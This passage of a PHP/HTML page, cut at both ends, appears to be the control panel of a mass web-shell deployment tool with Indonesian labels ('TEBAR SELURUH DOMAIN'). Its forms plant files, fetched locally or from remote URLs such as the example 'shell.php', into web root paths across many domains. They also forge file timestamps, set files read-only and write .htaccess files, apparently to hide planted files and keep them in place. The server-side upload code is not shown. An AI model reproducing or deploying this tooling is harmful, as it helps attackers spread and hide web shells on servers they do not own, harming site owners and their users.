        .table-responsive {
            max-height: 550px;
            overflow-y: auto;
            border: 1px solid #333;
            overflow-x: auto;
        }
        
        .table-tools {
            width: 100%;
            min-width: 1200px;
        }
        
        .btn-add-path {
            background-color: #004466;
            color: var(--neon-blue);
            border: 1px solid var(--neon-blue);
            padding: 2px 6px;
            font-weight: bold;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.75rem;
            transition: all 0.2s;
        }
        .btn-add-path:hover {
            background-color: var(--neon-blue);
            color: #000;
            box-shadow: 0 0 8px var(--neon-blue);
        }
        
        .btn-remove-row {
            background: transparent;
            border: 1px solid #ff3333;
            color: #ff3333;
            font-size: 0.7rem;
            padding: 2px 6px;
            cursor: pointer;
            transition: all 0.2s;
        }
        .btn-remove-row:hover {
            background: #ff3333;
            color: #000;
            box-shadow: 0 0 8px #ff3333;
        }
        
        .btn-action-r {
            background: transparent;
            border: 1px solid #0088ff;
            color: #0088ff;
            font-size: 0.7rem;
            padding: 2px 6px;
            cursor: pointer;
            transition: all 0.2s;
            margin-right: 2px;
        }
        .btn-action-r:hover {
            background: #0088ff;
            color: #000;
            box-shadow: 0 0 8px #0088ff;
        }
        
        .btn-action-p {
            background: transparent;
            border: 1px solid var(--neon-blue);
            color: var(--neon-blue);
            font-size: 0.7rem;
            padding: 2px 6px;
            cursor: pointer;
            transition: all 0.2s;
            margin-right: 2px;
        }
        .btn-action-p:hover {
            background: var(--neon-blue);
            color: #000;
        }
        
        .btn-action-f {
            background: transparent;
            border: 1px solid var(--neon-green);
            color: var(--neon-green);
            font-size: 0.7rem;
            padding: 2px 6px;
            cursor: pointer;
            transition: all 0.2s;
            margin-right: 2px;
        }
        .btn-action-f:hover {
            background: var(--neon-green);
            color: #000;
            box-shadow: 0 0 8px var(--neon-green);
        }
        
        /* Remote upload styling */
        .remote-url-input {
            background-color: #1a1a2e !important;
            border-color: #00ff88 !important;
        }
        
        .upload-type-selector {
            display: flex;
            gap: 10px;
            margin-bottom: 5px;
        }
        
        .upload-type-selector label {
            font-size: 0.7rem;
            margin-bottom: 0;
            cursor: pointer;
        }
        
        .file-input-wrapper {
            transition: all 0.2s;
        }
        
        .text-success {
            color: var(--neon-green) !important;
        }
        
        /* Delete button in results */
        .btn-delete-result {
            background: transparent;
            border: 1px solid #ff3333;
            color: #ff3333;
            font-size: 0.75rem;
            padding: 1px 6px;
            cursor: pointer;
            transition: all 0.2s;
            margin-left: 6px;
            border-radius: 0;
        }
        .btn-delete-result:hover {
            background: #ff3333;
            color: #000;
            box-shadow: 0 0 8px #ff3333;
        }
        .btn-delete-result:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }
        
        /* Delete Modal */
        .delete-modal-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.85);
            z-index: 9999;
            justify-content: center;
            align-items: center;
        }
        .delete-modal-overlay.active {
            display: flex;
        }
        .delete-modal-box {
            background: #0d1117;
            border: 1px solid #ff3333;
            box-shadow: 0 0 30px rgba(255, 51, 51, 0.3);
            padding: 25px;
            max-width: 420px;
            width: 90%;
            text-align: center;
        }
        .delete-modal-box h5 {
            color: #ff3333;
            text-transform: uppercase;
            letter-spacing: 2px;
            margin-bottom: 8px;
            font-size: 0.95rem;
        }
        .delete-modal-box .delete-path-info {
            color: #ffcc00;
            font-size: 0.75rem;
            word-break: break-all;
            background: #111;
            border: 1px solid #333;
            padding: 8px;
            margin: 12px 0;
        }
        .delete-modal-box .btn-delete-option {
            display: block;
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid;
            background: transparent;
            cursor: pointer;
            font-family: 'Fira Code', monospace;
            font-size: 0.8rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.2s;
        }
        .btn-delete-php {
            border-color: #ff9900 !important;
            color: #ff9900;
        }
        .btn-delete-php:hover {
            background: #ff9900 !important;
            color: #000;
            box-shadow: 0 0 12px #ff9900;
        }
        .btn-delete-both {
            border-color: #ff3333 !important;
            color: #ff3333;
        }
        .btn-delete-both:hover {
            background: #ff3333 !important;
            color: #000;
            box-shadow: 0 0 12px #ff3333;
        }
        .btn-delete-cancel {
            border-color: #666 !important;
            color: #666;
            margin-top: 12px;
        }
        .btn-delete-cancel:hover {
            background: #666 !important;
            color: #000;
        }
        .delete-status {
            margin-top: 10px;
            font-size: 0.75rem;
            display: none;
        }
    </style>
</head>
<body class="py-3">

<div class="container-fluid" style="max-width: 98%; margin: 0 auto;">
    
    <div class="text-center mb-3">
        <h2 class="fw-bold" style="text-shadow: 0 0 10px var(--neon-blue);">
            <i class="fas fa-cloud-upload-alt me-2"></i>UPLOAD_TABLE_TOOLS
        </h2>
        <p class="small text-muted">&lt;!-- Mass File Upload with Table Interface + Remote URL Support --&gt;</p>
    </div>

    <!-- Navbar Tabs -->
    <ul class="nav nav-tabs mb-3" id="uploadTabs" role="tablist" style="border-color: var(--neon-blue);">
        <li class="nav-item" role="presentation">
            <button class="nav-link active" id="tebar1-tab" data-bs-toggle="tab" data-bs-target="#tebar1" type="button" role="tab" aria-controls="tebar1" aria-selected="true" style="color: var(--neon-blue); border-color: var(--neon-blue);">
                <i class="fas fa-server me-2"></i>TEBAR 1 DOMAIN
            </button>
        </li>
        <li class="nav-item" role="presentation">
            <button class="nav-link" id="tebarall-tab" data-bs-toggle="tab" data-bs-target="#tebarall" type="button" role="tab" aria-controls="tebarall" aria-selected="false" style="color: var(--neon-blue); border-color: var(--neon-blue);">
                <i class="fas fa-globe me-2"></i>TEBAR SELURUH DOMAIN
            </button>
        </li>
    </ul>

    <?php echo $message; ?>

    <div class="tab-content" id="uploadTabsContent">
        <!-- Tab 1: Tebar 1 Domain -->
        <div class="tab-pane fade show active" id="tebar1" role="tabpanel" aria-labelledby="tebar1-tab">
            <form method="post" enctype="multipart/form-data" id="form-tebar1">
                <input type="hidden" name="mode" value="tebar1">
                <div class="card mb-3">
                    <div class="card-body p-3">
                        <h5 class="card-title"><i class="fas fa-upload me-2"></i>[ TEBAR 1 DOMAIN ]</h5>
                        <p class="small text-muted mb-2">Remote Upload: Pilih "🌐 Remote URL" lalu masukkan URL file (contoh: https://example.com/shell.php)</p>
                        
                        <div class="table-responsive mb-2">
                            <table class="table table-tools" id="upload-table">
                                <thead>
                                    <tr>
                                        <th style="width: 8%">NOTE</th>
                                        <th style="width: 20%">File Source</th>
                                        <th style="width: 18%">Path Target</th>
                                        <th style="width: 8%">Save As</th>
                                        <th style="width: 10%">Modify</th>
                                        <th style="width: 6%">chmod</th>
                                        <th style="width: 6%">htaccess</th>
                                        <th style="width: 6%">chmod ht</th>
                                        <th style="width: 8%">parameter</th>
                                        <th style="width: 10%">Action</th>
                                    </tr>
                                </thead>
                                <tbody id="upload-table-body">
                                    <tr class="upload-table-row main-row" data-row-id="1" data-file-id="1" style="background-color: #e8f5e8;">
                                        <td rowspan="1">
                                            <input type="hidden" name="upload_table_data[1][file_id]" value="1">
                                            <input type="text" name="upload_table_data[1][note]" placeholder="ZILA" class="form-control">
                                        </td>
                                        <td rowspan="1">
                                            <div class="upload-type-selector">
                                                <label><input type="radio" name="upload_type[1]" value="local" checked onchange="toggleUploadSource(this, 1)"> 📁 Local</label>
                                                <label><input type="radio" name="upload_type[1]" value="remote" onchange="toggleUploadSource(this, 1)"> 🌐 Remote URL</label>
                                            </div>
                                            <div class="file-input-wrapper" id="local-input-1">
                                                <input type="file" name="upload_files[1]" class="form-control">
                                            </div>
                                            <div class="remote-input-wrapper" id="remote-input-1" style="display: none;">
                                                <input type="text" name="remote_url[1]" class="form-control remote-url-input" placeholder="https://example.com/file.php">
                                            </div>
                                        </td>
                                        <td>
                                            <div class="d-flex">
                                                <input type="text" name="upload_table_data[1][path_target]" placeholder="/var/www/html" class="form-control">
                                                <button type="button" class="btn btn-sm btn-add-path ms-1" onclick="addPathRow(this, 1)">+</button>
                                            </div>
                                        </td>
                                        <td rowspan="1"><input type="text" name="upload_table_data[1][save_as]" placeholder="auto-detect" class="form-control"></td>
                                        <td rowspan="1"><input type="text" name="upload_table_data[1][modify_date]" placeholder="2017-07-11 12:51:23" class="form-control"></td>
                                        <td rowspan="1"><input type="text" name="upload_table_data[1][chmod_file]" value="0444" placeholder="0444" class="form-control"></td>
                                        <td rowspan="1">
                                            <select name="upload_table_data[1][htaccess_enabled]" class="form-control">
                                                <option value="no">No</option>
                                                <option value="yes">Yes</option>
                                            </select>
                                        </td>
                                        <td rowspan="1"><input type="text" name="upload_table_data[1][chmod_htaccess]" value="0444" placeholder="0444" class="form-control"></td>
                                        <td rowspan="1"><input type="text" name="upload_table_data[1][parameter]" placeholder="?param" class="form-control"></td>
                                        <td>
                                            <div class="d-flex">
                                                <button type="button" class="btn-action-r" title="Reset Path" onclick="resetRowPath(this)">r</button>
                                                <button type="button" class="btn-action-p" title="Add Path" onclick="addPathRow(this.closest('tr').querySelector('.btn-add-path'), 1)">+</button>
                                                <button type="button" class="btn-remove-row" title="Remove Entry" onclick="removeUploadRow(this, 1)">X</button>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                        
                        <div class="d-flex justify-content-between align-items-center">
                            <div>
                                <button type="button" class="btn-add-row me-2" onclick="addNewFileEntry()">
                                    <i class="fas fa-file-plus me-2"></i>ADD FILE
                                </button>
                            </div>
                            <button type="button" class="btn-hacker btn-sm" onclick="showManualFillHelp()">
                                <i class="fas fa-question-circle me-2"></i>HELP
                            </button>
                        </div>
                        
                        <?php if (!empty($upload_table_results)): ?>
                            <div class="mt-3">
                                <h6 class="text-uppercase mb-2" style="color: var(--neon-blue);">Upload Results:</h6>
                                <div class="table-responsive">
                                    <table class="table table-tools">
                                        <thead>
                                            <tr>
                                                <th>Path Target</th>
                                                <th>Original File</th>
                                                <th>Saved As</th>
                                                <th>Source</th>
                                                <th>Status</th>
                                                <th>Link</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <?php foreach ($upload_table_results as $result): ?>
                                                <tr>
                                                    <td><?php echo htmlspecialchars($result['path_target']); ?></td>
                                                    <td><?php echo htmlspecialchars($result['original_name']); ?></td>
                                                    <td><?php echo htmlspecialchars($result['save_as']); ?></td>
                                                    <td><?php echo isset($result['source']) && $result['source'] === 'remote' ? '🌐 Remote' : '📁 Local'; ?></td>
                                                    <td>
                                                        <?php if ($result['status'] === 'success'): ?>
                                                            <span class="status-success">✓ SUCCESS</span>
                                                        <?php else: ?>
                                                            <span class="status-failed">✗ FAILED: <?php echo htmlspecialchars($result['error']); ?></span>
                                                        <?php endif; ?>
                                                    </td>
                                                    <td>
                                                        <?php if ($result['status'] === 'success' && isset($result['link'])): ?>
                                                            <?php $full_path = rtrim($result['path_target'], '/\\') . DIRECTORY_SEPARATOR . $result['save_as']; ?>
                                                            <a href="<?php echo $result['link']; ?>" target="_blank" style="color: #0088ff;">Open</a>
                                                            <button type="button" class="btn-delete-result" title="Delete File" onclick="showDeleteModal('<?php echo addslashes($full_path); ?>', this)">🗑</button>
                                                        <?php endif; ?>
                                                    </td>
                                                </tr>
                                            <?php endforeach; ?>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        <?php endif; ?>
                        
                        <hr class="my-3">
                        
                        <button type="submit" name="submit_upload_table" class="btn btn-hacker w-100 py-2 fw-bold">
                            <i class="fas fa-rocket me-2"></i> EXECUTE_UPLOAD_TABLE_DEPLOYMENT
                        </button>
                    </div>
                </div>
            </form>
        </div>

        <!-- Tab 2: Tebar Seluruh Domain -->
        <div class="tab-pane fade" id="tebarall" role="tabpanel" aria-labelledby="tebarall-tab">
            <form method="post" enctype="multipart/form-data" id="form-tebarall">
                <input type="hidden" name="mode" value="tebarall">
                <div class="card mb-3">
                    <div class="card-body p-3">
                        <h5 class="card-title"><i class="fas fa-globe me-2"></i>[ TEBAR SELURUH DOMAIN ]</h5>
                        <p class="small text-muted mb-2">Remote Upload: Pilih "🌐 Remote URL" untuk mengambil file dari URL eksternal</p>
                        
                        <div class="table-responsive mb-2">
                            <table class="table table-tools" id="upload-table-all">
                                <thead>
                                    <tr>
                                        <th style="width: 10%">Domain</th>
                                        <th style="width: 6%">NOTE</th>
                                        <th style="width: 20%">File Source</th>
                                        <th style="width: 16%">Path Target</th>
                                        <th style="width: 8%">Save As</th>
                                        <th style="width: 9%">Modify</th>
                                        <th style="width: 5%">chmod</th>
                                        <th style="width: 5%">htaccess</th>
                                        <th style="width: 5%">chmod ht</th>
                                        <th style="width: 6%">param</th>
                                        <th style="width: 10%">Action</th>
                                    </tr>
                                </thead>
                                <tbody id="upload-table-body-all">
                                    <tr class="upload-table-row-all main-row-all domain-main-row-all" data-row-id-all="1" data-file-id-all="1" data-domain-id-all="1" style="background-color: #e8f5e8;">
                                        <td rowspan="1" class="col-domain-all">
                                            <input type="hidden" name="upload_table_data_all[1][file_id]" value="1">
                                            <input type="hidden" name="upload_table_data_all[1][domain_id]" value="1">
                                            <input type="text" name="upload_table_data_all[1][domain]" placeholder="example.com" class="form-control">
                                         </td>
                                        <td rowspan="1" class="col-note-all">
                                            <input type="text" name="upload_table_data_all[1][note]" placeholder="ZILA" class="form-control">
                                         </td>
                                        <td rowspan="1" class="col-source-all">
                                            <div class="upload-type-selector">
                                                <label><input type="radio" name="upload_type_all[1]" value="local" checked onchange="toggleUploadSourceAll(this, 1)"> 📁 Local</label>
                                                <label><input type="radio" name="upload_type_all[1]" value="remote" onchange="toggleUploadSourceAll(this, 1)"> 🌐 Remote URL</label>
                                            </div>
                                            <div class="file-input-wrapper" id="local-input-all-1">
                                                <input type="file" name="upload_files_all[1]" class="form-control">
                                            </div>
                                            <div class="remote-input-wrapper" id="remote-input-all-1" style="display: none;">
                                                <input type="text" name="remote_url_all[1]" class="form-control remote-url-input" placeholder="https://example.com/file.php">
                                            </div>
                                         </td>
                                        <td>
                                            <div class="d-flex">
                                                <input type="text" name="upload_table_data_all[1][path_target]" placeholder="/var/www/html" class="form-control">
                                                <button type="button" class="btn btn-sm btn-add-path ms-1" onclick="addPathRowAll(this, 1)">+</button>
                                            </div>
                                         </td>
                                        <td rowspan="1" class="col-saveas-all"><input type="text" name="upload_table_data_all[1][save_as]" placeholder="auto-detect" class="form-control"></td>
                                        <td rowspan="1" class="col-modify-all"><input type="text" name="upload_table_data_all[1][modify_date]" placeholder="2017-07-11 12:51:23" class="form-control"></td>
                                        <td rowspan="1" class="col-chmodfile-all"><input type="text" name="upload_table_data_all[1][chmod_file]" value="0444" placeholder="0444" class="form-control"></td>
                                        <td rowspan="1" class="col-htaccess-all">
                                            <select name="upload_table_data_all[1][htaccess_enabled]" class="form-control">
                                                <option value="no">No</option>
                                                <option value="yes">Yes</option>
                                            </select>
                                         </td>
                                        <td rowspan="1" class="col-chmodht-all"><input type="text" name="upload_table_data_all[1][chmod_htaccess]" value="0444" placeholder="0444" class="form-control"></td>
                                        <td rowspan="1" class="col-param-all"><input type="text" name="upload_table_data_all[1][parameter]" placeholder="?param" class="form-control"></td>
                                        <td>
                                            <div class="d-flex">
                                                <button type="button" class="btn-action-r" title="Reset Path" onclick="resetRowPath(this)">r</button>
                                                <button type="button" class="btn-action-f" title="Add File to Domain" onclick="addFileRowAll(this, 1)">F</button>
                                                <button type="button" class="btn-action-f" style="border-color: #ff9900; color: #ff9900;" title="Duplicate Entry" onclick="duplicateUploadRowAll(this)">D</button>
                                                <button type="button" class="btn-action-p" title="Add Path to File" onclick="addPathRowAll(this.closest('tr').querySelector('.btn-add-path'), 1)">+</button>
                                                <button type="button" class="btn-remove-row" title="Remove Entry" onclick="removeUploadRowAll(this, 1)">X</button>
                                            </div>
                                         </td>
                                    </tr>
                                </tbody>
                             </table>
                        </div>
                        
                        <div class="d-flex justify-content-between align-items-center">
                            <div>
                                <button type="button" class="btn-add-row me-2" onclick="addNewFileEntryAll()">
                                    <i class="fas fa-plus-circle me-2"></i>ADD DOMAIN
                                </button>
                            </div>
                            <button type="button" class="btn-hacker btn-sm" onclick="showManualFillHelpAll()">
                                <i class="fas fa-question-circle me-2"></i>HELP
                            </button>
                        </div>
                        
                        <?php if (!empty($upload_table_results_all)): ?>
                            <div class="mt-3">
                                <h6 class="text-uppercase mb-2" style="color: var(--neon-blue);">Upload Results:</h6>
                                <div class="table-responsive">
                                    <table class="table table-tools">
                                        <thead>
                                            <tr>
                                                <th>Domain</th>
                                                <th>Path Target</th>
                                                <th>Original File</th>
                                                <th>Saved As</th>
                                                <th>Source</th>
                                                <th>Status</th>
                                                <th>Link</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <?php foreach ($upload_table_results_all as $result): ?>
                                                <tr>
                                                    <td><?php echo htmlspecialchars($result['domain']); ?></td>
                                                    <td><?php echo htmlspecialchars($result['path_target']); ?></td>
                                                    <td><?php echo htmlspecialchars($result['original_name']); ?></td>
                                                    <td><?php echo htmlspecialchars($result['save_as']); ?></td>
                                                    <td><?php echo isset($result['source']) && $result['source'] === 'remote' ? '🌐 Remote' : '📁 Local'; ?></td>
                                                    <td>
                                                        <?php if ($result['status'] === 'success'): ?>
                                                            <span class="status-success">✓ SUCCESS</span>
                                                        <?php else: ?>
                                                            <span class="status-failed">✗ FAILED: <?php echo htmlspecialchars($result['error']); ?></span>
                                                        <?php endif; ?>
                                                     </td>
                                                    <td>
                                                        <?php if ($result['status'] === 'success' && isset($result['link'])): ?>
                                                            <?php $full_path_all = rtrim($result['path_target'], '/\\') . DIRECTORY_SEPARATOR . $result['save_as']; ?>
                                                            <a href="<?php echo $result['link']; ?>" target="_blank" style="color: #0088ff;">Open</a>
                                                            <button type="button" class="btn-delete-result" title="Delete File" onclick="showDeleteModal('<?php echo addslashes($full_path_all); ?>', this)">🗑</button>
                                                        <?php endif; ?>
                                                     </td>
                                                 </tr>
                                            <?php endforeach; ?>
                                        </tbody>
                                     </table>
                                </div>
                            </div>
                        <?php endif; ?>
                        
                        <hr class="my-3">
                        
                        <button type="submit" name="submit_upload_table_all" class="btn btn-hacker w-100 py-2 fw-bold">
                            <i class="fas fa-rocket me-2"></i> EXECUTE_UPLOAD_TABLE_DEPLOYMENT_ALL
                        </button>
                    </div>
                </div>
            </form>
        </div>
    </div>

    <div class="mt-4 mb-3 p-2 rounded" style="background: #111; border: 1px solid #222;">
        <h6 class="text-muted small mb-2"><i class="fas fa-microchip me-2"></i>SERVER_LIMIT_INFO:</h6>
        <div class="row text-center small">
            <div class="col-md-3">
                <div class="text-muted">Max File Uploads</div>
                <div class="fw-bold" style="color: var(--neon-blue);"><?php echo ini_get('max_file_uploads'); ?></div>
            </div>
            <div class="col-md-3">
                <div class="text-muted">Max Input Vars</div>
                <div class="fw-bold" style="color: var(--neon-green);"><?php echo ini_get('max_input_vars'); ?></div>
            </div>
            <div class="col-md-3">
                <div class="text-muted">Post Max Size</div>
                <div class="fw-bold" style="color: #ffcc00;"><?php echo ini_get('post_max_size'); ?></div>
            </div>
            <div class="col-md-3">
                <div class="text-muted">Upload Max Filesize</div>
                <div class="fw-bold" style="color: #ff3333;"><?php echo ini_get('upload_max_filesize'); ?></div>
            </div>
        </div>
        <div class="text-center mt-2 small text-muted">
            *Tips: Remote upload mendukung HTTP/HTTPS, follow redirect, timeout 60 detik.
        </div>
    </div>

    <div class="text-center small" style="color: #333;">
        root@system:~/tools# _ [Remote Upload Enabled]
    </div>
</div>

<script>
    // --- Upload Table Tools Functions with Remote Upload ---
    var uploadTableRowCounter = 1;
    var fileEntryCounter = 1;
    var uploadTableRowCounterAll = 1;
    var fileEntryCounterAll = 1;
    var domainEntryCounterAll = 1;
    
    // Toggle between local file upload and remote URL input
    function toggleUploadSource(radio, rowId) {
        var isRemote = radio.value === 'remote';
        var localDiv = document.getElementById('local-input-' + rowId);
        var remoteDiv = document.getElementById('remote-input-' + rowId);
        
        if (localDiv) localDiv.style.display = isRemote ? 'none' : 'block';
        if (remoteDiv) remoteDiv.style.display = isRemote ? 'block' : 'none';
        
        // Toggle required attribute
        var fileInput = localDiv ? localDiv.querySelector('input[type="file"]') : null;
        var remoteInput = remoteDiv ? remoteDiv.querySelector('input[type="text"]') : null;
        
        if (fileInput) fileInput.required = !isRemote;
        if (remoteInput) remoteInput.required = isRemote;
    }
    
    function toggleUploadSourceAll(radio, rowId) {
        var isRemote = radio.value === 'remote';
        var localDiv = document.getElementById('local-input-all-' + rowId);
        var remoteDiv = document.getElementById('remote-input-all-' + rowId);
        
        if (localDiv) localDiv.style.display = isRemote ? 'none' : 'block';
        if (remoteDiv) remoteDiv.style.display = isRemote ? 'block' : 'none';
        
        var fileInput = localDiv ? localDiv.querySelector('input[type="file"]') : null;
        var remoteInput = remoteDiv ? remoteDiv.querySelector('input[type="text"]') : null;
        
        if (fileInput) fileInput.required = !isRemote;
        if (remoteInput) remoteInput.required = isRemote;
    }
    
    function addNewFileEntry() {
        fileEntryCounter++;
        uploadTableRowCounter++;
        var tableBody = document.getElementById('upload-table-body');
        var newRow = document.createElement('tr');
        newRow.className = 'upload-table-row main-row';
        newRow.setAttribute('data-row-id', uploadTableRowCounter);
        newRow.setAttribute('data-file-id', fileEntryCounter);
        newRow.style.backgroundColor = '#e8f5e8';
        
        newRow.innerHTML = `
            <td rowspan="1">
                <input type="hidden" name="upload_table_data[${uploadTableRowCounter}][file_id]" value="${fileEntryCounter}">
                <input type="text" name="upload_table_data[${uploadTableRowCounter}][note]" placeholder="NOTE" class="form-control">
             </td>
            <td rowspan="1">
                <div class="upload-type-selector">
                    <label><input type="radio" name="upload_type[${uploadTableRowCounter}]" value="local" checked onchange="toggleUploadSource(this, ${uploadTableRowCounter})"> 📁 Local</label>
                    <label><input type="radio" name="upload_type[${uploadTableRowCounter}]" value="remote" onchange="toggleUploadSource(this, ${uploadTableRowCounter})"> 🌐 Remote URL</label>
                </div>
                <div class="file-input-wrapper" id="local-input-${uploadTableRowCounter}">
                    <input type="file" name="upload_files[${uploadTableRowCounter}]" class="form-control">
                </div>
                <div class="remote-input-wrapper" id="remote-input-${uploadTableRowCounter}" style="display: none;">
                    <input type="text" name="remote_url[${uploadTableRowCounter}]" class="form-control remote-url-input" placeholder="https://example.com/file.php">
                </div>
             </td>
            <td>
                <div class="d-flex">
                    <input type="text" name="upload_table_data[${uploadTableRowCounter}][path_target]" placeholder="/var/www/html" class="form-control">
                    <button type="button" class="btn btn-sm btn-add-path ms-1" onclick="addPathRow(this, ${fileEntryCounter})">+</button>
                </div>
             </td>
            <td rowspan="1"><input type="text" name="upload_table_data[${uploadTableRowCounter}][save_as]" placeholder="auto-detect" class="form-control"></td>
            <td rowspan="1"><input type="text" name="upload_table_data[${uploadTableRowCounter}][modify_date]" placeholder="2017-07-11 12:51:23" class="form-control"></td>
            <td rowspan="1"><input type="text" name="upload_table_data[${uploadTableRowCounter}][chmod_file]" value="0444" placeholder="0444" class="form-control"></td>
            <td rowspan="1">
                <select name="upload_table_data[${uploadTableRowCounter}][htaccess_enabled]" class="form-control">
                    <option value="no">No</option>
                    <option value="yes">Yes</option>
                </select>
             </td>
            <td rowspan="1"><input type="text" name="upload_table_data[${uploadTableRowCounter}][chmod_htaccess]" value="0444" placeholder="0444" class="form-control"></td>
            <td rowspan="1"><input type="text" name="upload_table_data[${uploadTableRowCounter}][parameter]" placeholder="?param" class="form-control"></td>
            <td>
                <div class="d-flex">
                    <button type="button" class="btn-action-r" title="Reset Path" onclick="resetRowPath(this)">r</button>
                    <button type="button" class="btn-action-p" title="Add Path" onclick="addPathRow(this.closest('tr').querySelector('.btn-add-path'), ${fileEntryCounter})">+</button>
                    <button type="button" class="btn-remove-row" title="Remove Entry" onclick="removeUploadRow(this, ${fileEntryCounter})">X</button>
                </div>
             </td>
        `;
        
        tableBody.appendChild(newRow);
    }
    
    function addPathRow(btn, fileId) {
        uploadTableRowCounter++;
        var tableBody = document.getElementById('upload-table-body');
        var newRow = document.createElement('tr');
        newRow.className = 'upload-table-row path-row';
        newRow.setAttribute('data-row-id', uploadTableRowCounter);
        newRow.setAttribute('data-file-id', fileId);
        
        newRow.innerHTML = `
            <td>
                <div class="d-flex">
                    <input type="hidden" name="upload_table_data[${uploadTableRowCounter}][file_id]" value="${fileId}">
                    <input type="text" name="upload_table_data[${uploadTableRowCounter}][path_target]" placeholder="/var/www/html" class="form-control">
                    <button type="button" class="btn btn-sm btn-add-path ms-1" onclick="addPathRow(this, ${fileId})">+</button>
                </div>
             </td>
            <td>
                <div class="d-flex">
                    <button type="button" class="btn-action-r" title="Reset Path" onclick="resetRowPath(this)">r</button>
                    <button type="button" class="btn-action-p" title="Add Path" onclick="addPathRow(this.closest('tr').querySelector('.btn-add-path'), ${fileId})">+</button>
                    <button type="button" class="btn-remove-row" title="Remove Path" onclick="removeUploadRow(this, ${fileId})">X</button>
                </div>
             </td>
        `;
        
        var mainRow = document.querySelector(`.main-row[data-file-id="${fileId}"]`);
        if (mainRow) {
            var colsToSpan = [0, 1, 3, 4, 5, 6, 7, 8];
            colsToSpan.forEach(function(index) {
                var cell = mainRow.cells[index];
                if (cell) cell.rowSpan = (cell.rowSpan || 1) + 1;
            });
        }
        
        var currentRow = btn.closest('tr');
        currentRow.parentNode.insertBefore(newRow, currentRow.nextSibling);
    }
    
    function removeUploadRow(button, fileId) {
        var row = button.closest('tr');
        var isMainRow = row.classList.contains('main-row');
        
        if (isMainRow) {
            var associatedRows = document.querySelectorAll('[data-file-id="' + fileId + '"]');
            var mainRows = document.querySelectorAll('.main-row');
            if (mainRows.length <= 1) {
                alert('[!] Tidak bisa hapus file terakhir. Minimal satu file harus tersisa.');
                return;
            }
            associatedRows.forEach(function(r) { r.remove(); });
        } else {
            var mainRow = document.querySelector(`.main-row[data-file-id="${fileId}"]`);
            if (mainRow) {
                var colsToSpan = [0, 1, 3, 4, 5, 6, 7, 8];
                colsToSpan.forEach(function(index) {
                    var cell = mainRow.cells[index];
                    if (cell && cell.rowSpan > 1) cell.rowSpan--;
                });
            }
            row.remove();
        }
    }
    
    function resetRowPath(btn) {
        var row = btn.closest('tr');
        var pathInput = row.querySelector('input[placeholder*="/var/www/html"]');
        if (pathInput) pathInput.value = '';
    }
    
    function showManualFillHelp() {
        alert('[SYSTEM] USAGE (Remote Upload Enabled):\n\n📁 LOCAL UPLOAD:\n- Pilih "Local" lalu browse file dari komputer\n\n🌐 REMOTE UPLOAD:\n- Pilih "Remote URL" lalu masukkan URL file (contoh: https://example.com/shell.php)\n- File akan di-download dari internet dan diupload ke target\n- Nama file otomatis diambil dari URL\n\n📋 SETTINGS:\n- NOTE: Label untuk link hasil upload\n- Path Target: Direktori tujuan di server\n- Save As: Nama file tujuan (kosong = auto dari source)\n- Modify: Ubah timestamp file (format: YYYY-MM-DD HH:MM:SS)\n- chmod file: Permission file (0444 = read-only)\n- htaccess: Proteksi file dari eksekusi\n- parameter: String tambahan di URL\n\n🎯 TIPS:\n- ADD FILE: Tambah file baru\n- + (Add Path): Tambah path tujuan untuk file yang sama\n- r: Reset path input\n- X: Hapus row');
    }
    
    // --- Functions for Tebar Seluruh Domain ---
    function addNewFileEntryAll() {
        fileEntryCounterAll++;
        domainEntryCounterAll++;
        uploadTableRowCounterAll++;
        var tableBody = document.getElementById('upload-table-body-all');
        var newRow = document.createElement('tr');
        newRow.className = 'upload-table-row-all main-row-all domain-main-row-all';
        newRow.setAttribute('data-row-id-all', uploadTableRowCounterAll);
        newRow.setAttribute('data-file-id-all', fileEntryCounterAll);
        newRow.setAttribute('data-domain-id-all', domainEntryCounterAll);
        newRow.style.backgroundColor = '#e8f5e8';
        
        newRow.innerHTML = `
            <td rowspan="1" class="col-domain-all">
                <input type="hidden" name="upload_table_data_all[${uploadTableRowCounterAll}][domain_id]" value="${domainEntryCounterAll}">
                <input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][domain]" placeholder="example.com" class="form-control">
              </td>
            <td rowspan="1" class="col-note-all">
                <input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][note]" placeholder="NOTE" class="form-control">
              </td>
            <td rowspan="1" class="col-source-all">
                <div class="upload-type-selector">
                    <label><input type="radio" name="upload_type_all[${uploadTableRowCounterAll}]" value="local" checked onchange="toggleUploadSourceAll(this, ${uploadTableRowCounterAll})"> 📁 Local</label>
                    <label><input type="radio" name="upload_type_all[${uploadTableRowCounterAll}]" value="remote" onchange="toggleUploadSourceAll(this, ${uploadTableRowCounterAll})"> 🌐 Remote URL</label>
                </div>
                <div class="file-input-wrapper" id="local-input-all-${uploadTableRowCounterAll}">
                    <input type="file" name="upload_files_all[${uploadTableRowCounterAll}]" class="form-control">
                </div>
                <div class="remote-input-wrapper" id="remote-input-all-${uploadTableRowCounterAll}" style="display: none;">
                    <input type="text" name="remote_url_all[${uploadTableRowCounterAll}]" class="form-control remote-url-input" placeholder="https://example.com/file.php">
                </div>
              </td>
            <td>
                <div class="d-flex">
                    <input type="hidden" name="upload_table_data_all[${uploadTableRowCounterAll}][file_id]" value="${fileEntryCounterAll}">
                    <input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][path_target]" placeholder="/var/www/html" class="form-control">
                    <button type="button" class="btn btn-sm btn-add-path ms-1" onclick="addPathRowAll(this, ${fileEntryCounterAll})">+</button>
                </div>
              </td>
            <td rowspan="1" class="col-saveas-all"><input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][save_as]" placeholder="auto-detect" class="form-control"></td>
            <td rowspan="1" class="col-modify-all"><input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][modify_date]" placeholder="2017-07-11 12:51:23" class="form-control"></td>
            <td rowspan="1" class="col-chmodfile-all"><input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][chmod_file]" value="0444" placeholder="0444" class="form-control"></td>
            <td rowspan="1" class="col-htaccess-all">
